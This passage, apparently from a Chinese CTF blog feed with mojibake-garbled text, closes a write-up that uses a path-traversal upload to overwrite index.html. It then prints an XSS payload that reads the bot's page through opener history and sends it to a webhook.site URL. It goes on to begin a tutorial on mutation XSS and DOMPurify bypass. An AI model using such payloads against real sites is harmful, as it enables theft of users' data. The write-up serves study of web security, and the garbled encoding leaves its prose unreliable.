imgElement<span class="token punctuation">.</span>alt <span class="token operator">=</span> <span class="token template-string"><span class="token string">`Image: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>fileName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>          galleryDiv<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>imgElement<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ç§ç›´æ¥ç»™å¯¹è±¡å±æ€§èµ‹å€¼çš„æ“ä½œå¦‚æœèƒ½é€ƒé€¸æ„Ÿè§‰å¾—æ˜¯æµè§ˆå™¨çš„æ´äº†233ã€‚</p><p>è®¿é—®æ ¹è·¯ç”±ä¼šæ ¹æ®ä½ çš„<code>sid</code>è¯»æ–‡ä»¶ã€‚</p><p><code>upload</code>é‚£é‡Œ<code>sid</code>å¯æ§ï¼Œå¯ä»¥æ‰“ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span><span class="token keyword">async</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>files <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>      <span class="token keyword">const</span> uploadedFile <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">.</span>image<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>uploadedFile<span class="token punctuation">.</span>size <span class="token operator">></span> maxSizeInBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File size exceeds the limit.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">await</span> uploadedFile<span class="token punctuation">.</span><span class="token function">mv</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>uploadedFile<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="index-html-XSS"><a href="#index-html-XSS" class="headerlink" title="index.html XSS"></a>index.html XSS</h5><p>é¢˜ç›®ç»™çš„é™„ä»¶é‡Œæœ‰ä¸ªç©ºçš„<code>public</code>ã€‚</p><p>å¹¶ä¸”è®¾ç½®äº†é™æ€ç›®å½•ï¼Œè€Œ<code>bot</code>è®¿é—®çš„æ­£æ˜¯æ ¹è·¯ç”±ï¼Œæ‰€ä»¥åªè¦å†™å…¥<code>public/index.html</code>å°±å¯ä»¥åœ¨æ ¹ç›®å½•å®ç°<code>XSS</code>äº†ã€‚ã€‚ã€‚</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»¤<code>sid=../public</code>ï¼Œä¸Šä¼ ä¸ª<code>index.html</code>æµ‹è¯•ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709103008567.png" alt="1709103008567"></p><p>ä¸è¿‡æœ‰ä¸ªå‘ã€‚é¢˜ç›®è®¾ç½®äº†<code>httponly</code>ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡<code>bot</code>ç¬¬äºŒæ¬¡è®¿é—®<code>index.html</code>è§¦å‘<code>js</code>æ‹¿ç¬¬ä¸€æ¬¡<code>bot</code>è®¿é—®çš„<code>content</code>ï¼Œç„¶åå†å¤–å¸¦ã€‚å¦‚æœä¸€å¼€å§‹ç›´æ¥è¦†ç›–<code>index.html</code>é‚£ä¹ˆ<code>bot</code>ç¬¬ä¸€æ¬¡ä¹Ÿæ‹¿ä¸åˆ°<code>flag</code>çš„è·¯å¾„äº†ã€‚</p><p>è€Œ<code>bot</code>è¿™é‡Œå»¶è¿Ÿä¸‰ç§’ç»™äº†æˆ‘ä»¬ç«äº‰çš„æœºä¼šã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬äºŒä¸ªé—®é¢˜æ˜¯å‡è®¾æˆ‘ä»¬ç¬¬äºŒæ¬¡èƒ½<code>xss</code>äº†ï¼Œä½†æ˜¯å¦‚ä½•æ‹¿åˆ°<code>bot</code>ç¬¬ä¸€æ¬¡è®¿é—®çš„å†…å®¹ï¼Ÿ</p><p>é€šè¿‡<code>window.history.back()</code>æˆ–è€…<code>window.history.go(-1)</code>å³å¯ã€‚</p><h5 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h5><p>ç¬¬ä¸€æ­¥ç‚¹å‡»<code>share</code>ï¼Œæ­¤æ—¶<code>bot</code>è®¿é—®é¦–é¡µæ‹¿åˆ°<code>flag</code>å†…å®¹ã€‚</p><p>ç¬¬äºŒæ­¥é©¬ä¸Šä¸Šä¼ <code>public/index.html</code>å³å¯ã€‚</p><p><strong>index.html</strong></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token punctuation">(</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>opener<span class="token punctuation">)</span><span class="token punctuation">{</span>            opener<span class="token punctuation">.</span>window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>r<span class="token operator">=</span><span class="token operator">></span><span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token string">'https://webhook.site/5d88d116-b5e8-4791-82f3-610e03b61ff4'</span><span class="token punctuation">,</span>opener<span class="token punctuation">.</span>window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'/?test'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°<code>flag</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709104679525.png" alt="1709104679525"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»TPCTFä¹‹walk off the earthçœ‹mXSS</title>
      <link href="/2023/12/04/mutation-xss-tu-bian-xss/"/>
      <url>/2023/12/04/mutation-xss-tu-bian-xss/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è¿™æ¬¡XCTFèº«ä¸ºXSSåƒåœ¾çš„æˆ‘æœä¸å…¶ç„¶åˆåç‰¢äº†ï¼Œç°åœ¨å›½é™…èµ›çœŸçš„æ˜¯ä¸€åŠä»¥ä¸Šéƒ½æ˜¯XSSï¼Œçœ‹äº†çœ‹å¸ˆå‚…çš„åšå®¢å°±æ˜¯ç»™äº†ä¸ªpayloadï¼Œæ²¡æœ‰åˆ†æåŸç†ã€‚ä»Šå¤©å°±æ¥å­¦ä¹ ä¸€ä¸‹mXSSã€‚ä¸»è¦è¿˜æ˜¯è·Ÿç€<a href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass">è¿™ç¯‡DOMPurifyç»•è¿‡</a>å­¦ä¹ ã€‚</p></blockquote><h4 id="ä»€ä¹ˆæ˜¯mXSS"><a href="#ä»€ä¹ˆæ˜¯mXSS" class="headerlink" title="ä»€ä¹ˆæ˜¯mXSS"></a>ä»€ä¹ˆæ˜¯mXSS</h4><p><code>mXSS</code>çš„å®šä¹‰æ˜¯</p><blockquote><p>å¦‚æœç”¨æˆ·æ‰€æä¾›çš„å¯Œæ–‡æœ¬å†…å®¹é€šè¿‡javascriptä»£ç è¿›å…¥innerHTMLå±æ€§åï¼Œä¸€äº›æ„å¤–çš„å˜åŒ–ä¼šä½¿å¾—è¿™ä¸ªè®¤å®šä¸å†æˆç«‹ï¼šæµè§ˆå™¨çš„æ¸²æŸ“å¼•æ“ä¼šå°†æœ¬æ¥æ²¡æœ‰ä»»ä½•å±å®³çš„HTMLä»£ç æ¸²æŸ“æˆå…·æœ‰æ½œåœ¨å±é™©çš„XSSæ”»å‡»ä»£ç ã€‚</p><p>éšåï¼Œè¯¥æ®µæ”»å‡»ä»£ç ï¼Œå¯èƒ½ä¼šè¢«JSä»£ç ä¸­çš„å…¶å®ƒä¸€äº›æµç¨‹è¾“å‡ºåˆ°DOMä¸­æˆ–æ˜¯å…¶å®ƒæ–¹å¼è¢«å†æ¬¡æ¸²æŸ“ï¼Œä»è€Œå¯¼è‡´XSSçš„æ‰§è¡Œã€‚ è¿™ç§ç”±äºHTMLå†…å®¹è¿›å…¥innerHTMLåå‘ç”Ÿæ„å¤–å˜åŒ–ï¼Œè€Œæœ€ç»ˆå¯¼è‡´XSSçš„æ”»å‡»æµç¨‹ã€‚</p></blockquote><p>è¯»å®Œæ–‡ç« äº‘é‡Œé›¾é‡Œçš„ï¼Œä½†æ˜¯çœ‹ä¸­æ–‡å®šä¹‰å°±æœ‰ä¸€ç‚¹ç‚¹æ‡‚äº†ï¼Œæ„Ÿè§‰å°±æ˜¯è§£æå·®å¼‚å¯¼è‡´çš„é—®é¢˜ã€‚è€Œè¿™éƒ¨åˆ†çŸ¥è¯†çš„éš¾ç‚¹æˆ‘æƒ³å°±åœ¨äºæ‰¾åˆ°ä»€ä¹ˆå…ƒç´ ä¼šé€ æˆè§£æå·®å¼‚ã€‚</p><p>æ­¤æ—¶æˆ‘æœ‰ä¸€ä¸ªç–‘é—®ï¼Œä¸ºä»€ä¹ˆä¼šå­˜åœ¨è§£æå·®å¼‚é—®é¢˜ï¼Ÿä¸€èˆ¬æ¥è¯´ä¸å°±æ˜¯æŠŠä¸€æ®µ<code>html</code>æ ‡ç­¾äº¤ç»™æµè§ˆå™¨è§£æä»è€Œç”Ÿæˆ<code>DOM</code>æ ‘æœ€ç»ˆæ¸²æŸ“åˆ°é¡µé¢ä¸Šï¼Œå“ªæ¥çš„å¦ä¸€ä¸ªè§£æå™¨ï¼Ÿ</p><p>ç„¶è€Œæˆ‘å´å¿½è§†äº†éœ€æ±‚ï¼Œåªç«™åœ¨æ¸²æŸ“é¡µé¢çš„è§’åº¦ä¸Šç¡®å®ä¸éœ€è¦é¢å¤–çš„è§£æå™¨ï¼Œåªéœ€è¦æµè§ˆå™¨ä¸€ä¸ªè§£æå™¨è§£ææˆ‘ä»¬çš„<code>html</code>å³å¯ã€‚æˆ‘æƒ³ä¼šæœ‰ä»ä¸¤ä¸ªè§’åº¦å‡ºå‘çš„éœ€æ±‚ï¼š</p><ol><li>å®‰å…¨è§’åº¦ï¼šè¾“å…¥æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œè¦æƒ³è¿‡æ»¤ä¸€äº›å±é™©æ ‡ç­¾æˆ–å±æ€§çš„è¯æˆ‘ä»¬ä¸å¯èƒ½ç­‰æµè§ˆå™¨æ¸²æŸ“å®Œå†æäº‹æƒ…å§ï¼Œé™¤éç›´æ¥æŠŠæµè§ˆå™¨<code>hook</code>äº†ã€‚è¿™æ—¶å€™å°±éœ€è¦å¼•å…¥è¿‡æ»¤åº“ï¼Œè€Œæƒ³è¦è¿‡æ»¤å±é™©æ ‡ç­¾å°±å¿…é¡»å…ˆè‡ªå·±è§£æä¸€éã€‚</li><li>è°ƒè¯•è§’åº¦ï¼šå¼€å‘æƒ³è¦çœ‹è‡ªå·±å¼€å‘çš„æ•ˆæœä½†æ˜¯åˆä¸æƒ³æ¸²æŸ“å‡ºæ¥ï¼Œæ¯æ¬¡çœ‹æ•ˆæœè¿˜å¾—ä¸Šæµè§ˆå™¨çœ‹ä¸æ–¹ä¾¿ï¼Œè¿™æ—¶å€™å¯èƒ½ä¹Ÿéœ€è¦ä¸€ä¸ªè§£æå™¨æ¥è°ƒè¯•ã€‚</li></ol><p>ä»å®‰å…¨è§’åº¦è€ƒè™‘çš„è¿‡æ»¤ç»„ä»¶<code>DOMPurify</code>æµç¨‹å¦‚ä¸‹ï¼š</p><pre><code>1.ç”¨æˆ·è¾“å…¥ä¸€æ®µhtmlæ–‡æœ¬ã€‚2.htmlè¢«è§£ææˆDOMæ ‘ã€‚3.DOMPurifyæ¸…ç†DOMæ ‘ï¼ˆè¯¥è¿‡ç¨‹æ˜¯éå† DOM æ ‘ä¸­çš„æ‰€æœ‰å…ƒç´ å’Œå±æ€§ï¼Œå¹¶åˆ é™¤ä¸åœ¨å…è®¸åˆ—è¡¨ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼‰ã€‚4.DOMæ ‘è¢«åºåˆ—åŒ–å› HTML æ ‡è®°ä»¥åˆ†é…ç»™document.innerHTMLã€‚5.æµè§ˆå™¨å†æ¬¡è§£æ HTML æ ‡è®°ã€‚6.DOMæ¸²æŸ“ã€‚</code></pre><p>ä¸‹é¢å°±æ¥å­¦ä¹ ä¸€ä¸‹<code>bypass DOMPurify</code>å¿…å¤‡çš„çŸ¥è¯†ç‚¹ã€‚</p><h4 id="formè¡¨å•åµŒå¥—"><a href="#formè¡¨å•åµŒå¥—" class="headerlink" title="formè¡¨å•åµŒå¥—"></a>formè¡¨å•åµŒå¥—</h4><p><code>form</code>æ ‡ç­¾æ¯”è¾ƒç‰¹æ®Šã€‚ä»–ä¸èƒ½åµŒå¥—è‡ªå·±ã€‚</p><p><a href="https://html.spec.whatwg.org/#the-form-element">https://html.spec.whatwg.org/#the-form-element</a></p><pre><code>Content model:Flow content, but with no form element descendants.å¤§æ¦‚æ„æ€å°±æ˜¯formå…ƒç´ ä¸èƒ½æœ‰formå…ƒç´ ä½œä¸ºå„¿å­èŠ‚ç‚¹ï¼Œè¿™æ˜¯è§„çŸ©ã€‚</code></pre><p>ä¸ä¿¡ä½ å°±è¯•è¯•ã€‚åæ­£æˆ‘ä¸ä¿¡æˆ‘è¯•äº†ã€‚</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    nonono form<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>form1</span><span class="token punctuation">></span></span>        INSIDE_FORM1        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>form2</span><span class="token punctuation">></span></span>        INSIDE_FORM2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>That&#39;s cool,man.</code></p><p><code>form2</code>çœŸçš„è¢«æµè§ˆå™¨å›åƒæ‰äº†ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701673837259.png" alt="1701673837259" width="25%" height="25%" /><p><code>form</code>æ— æ³•åµŒå¥—åˆ›å»ºçš„åŸå› ï¼š<strong>å½“è¯†åˆ«åˆ° <code>form</code>æ ‡è®°æ—¶ï¼Œè§£æå™¨éœ€è¦è®°å½•ä¸€ä¸‹å½“å‰æ˜¯ä½¿ç”¨è¡¨å•å…ƒç´ æŒ‡é’ˆæ‰“å¼€çš„ã€‚åªæœ‰æŒ‡é’ˆä¸ºç©ºçš„æ—¶å€™æ‰å¯ä»¥ç»§ç»­åˆ›å»ºè¡¨å•å…ƒç´ ï¼Œæ˜¾ç„¶ä¸Šè¿°è¿™ç§æƒ…å†µæŒ‡é’ˆè¿˜æ˜¯å­˜åœ¨çš„ã€‚</strong></p><p>ç„¶åä½œè€…åˆæåˆ°äº†ä¸€ä¸ªå˜å¼‚çš„<code>trick</code>å¯ä»¥æä¸€ä¸ªåµŒå¥—ï¼Œä»¥ä¸‹é¢ä¸ºä¾‹ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    nonono form<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªå°±å¯ä»¥ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701674343414.png" alt="1701674343414" width="5%" height="5%" /><p>è®©æˆ‘ä»¬è·Ÿç€ä½œè€…åˆ†æä¸€ä¸‹åŸå› ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·å¯ä»¥åµŒå¥—çš„åŸå› æ˜¯ï¼š<strong>ä¸€å¼€å§‹ï¼Œè¡¨å•å…ƒç´ æŒ‡é’ˆè¢«è®¾ç½®æˆ id&#x3D;â€outerâ€çš„æŒ‡é’ˆã€‚ ç„¶åè¯†åˆ«ä¸€ä¸ªdivï¼Œæ¥ç€ç¢°åˆ°&#x2F;formç»“æŸæ ‡è®°å°†è¡¨å•å…ƒç´ æŒ‡é’ˆè®¾ç½®ä¸º nullã€‚ å› ä¸ºè¡¨å•æŒ‡é’ˆç°åœ¨æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ›å»ºä¸‹ä¸€ä¸ª id&#x3D;â€innerâ€ çš„è¡¨å•ã€‚æ³¨æ„ï¼Œè™½ç„¶ç¬¬ä¸€ä¸ª&#x2F;formç»“æŸäº†ä½†å®é™…ä¸Šdivåœ¨ç¬¬ä¸€ä¸ªformæ ‡ç­¾é‡Œï¼Œè€Œç¬¬äºŒä¸ªformåœ¨divæ ‡ç­¾é‡Œï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ç¬¬ä¸€ä¸ªformå…ƒç´ é‡Œã€‚å› æ­¤è¿™æ ·ä¸€ä¸ªç•¸å½¢ç»“æ„æ˜¯èƒ½è¾¾åˆ°åµŒå¥—çš„æ•ˆæœçš„ã€‚</strong></p><p>è€Œæ­¤æ—¶ç”Ÿæˆçš„<code>DOM</code>æ ‘åºåˆ—åŒ–ååˆ™å˜æˆï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæ­¤æ—¶åœ¨ç”¨æµè§ˆå™¨è§£æï¼Œå› ä¸ºç¬¬ä¸€ä¸ª<code>outer</code>æŒ‡é’ˆç›´åˆ°ç¢°åˆ°äº†<code>inner</code>è¿˜æ˜¯ä¸ä¸ºç©ºï¼Œæ‰€ä»¥å®ƒå°±å˜æˆäº†ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å°±é€ æˆäº†è§£æå·®å¼‚ã€‚</p><h4 id="å‘½åç©ºé—´æ··æ·†"><a href="#å‘½åç©ºé—´æ··æ·†" class="headerlink" title="å‘½åç©ºé—´æ··æ·†"></a>å‘½åç©ºé—´æ··æ·†</h4><p><code>HTML</code>è§£æå™¨å¯ä»¥åˆ›å»ºåŒ…å«ä¸‰ä¸ªå‘½åç©ºé—´å…ƒç´ çš„<code>DOM</code>æ ‘ï¼š</p><ul><li><code>HTML</code>å‘½åç©ºé—´ ( <code>http://www.w3.org/1999/xhtml</code>)</li><li><code>SVG</code>å‘½åç©ºé—´ ( <code>http://www.w3.org/2000/svg</code>)</li><li><code>MathML</code>å‘½åç©ºé—´ ( <code>http://www.w3.org/1998/Math/MathML</code>)</li></ul><p>æ‰€æœ‰å…ƒç´ éƒ½ä½äº<code>HTML</code>å‘½åç©ºé—´ä¸­ï¼›ç„¶è€Œï¼Œå¦‚æœè§£æå™¨é‡åˆ°<code>&lt;svg&gt;</code>or<code>&lt;math&gt;</code>å…ƒç´ ï¼Œé‚£ä¹ˆå°±ä¼šåˆ‡æ¢åˆ°<code>SVG</code>å’Œ<code>MathML</code>å‘½åç©ºé—´ã€‚è¿™ä¸¤ä¸ªå‘½åç©ºé—´éƒ½ä¼šäº§ç”Ÿå¤–æ¥å†…å®¹ã€‚</p><p>é‡ç‚¹æ¥äº†ã€‚</p><p><strong>åœ¨å¤–æ¥å†…å®¹ä¸­ï¼Œæ ‡è®°çš„è§£ææ–¹å¼ä¸æ™®é€š HTML ä¸­çš„è§£ææ–¹å¼ä¸åŒï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†å‘½åæ··æ·†é—®é¢˜ã€‚</strong>åœ¨<code>&lt;style&gt;</code>å…ƒç´ çš„è§£æä¸Šå¯ä»¥æ¸…æ¥šåœ°æ˜¾ç¤ºå‡ºæ¥ã€‚åœ¨<code>HTML</code>å‘½åç©ºé—´ä¸­ï¼Œ<code>&lt;style&gt;</code>åªèƒ½åŒ…å«æ–‡æœ¬ã€æ²¡æœ‰å­å…ƒç´ ï¼ˆåä»£èŠ‚ç‚¹ï¼‰ï¼Œå¹¶ä¸” HTML å®ä½“ä¸ä¼šè¢«è§£ç 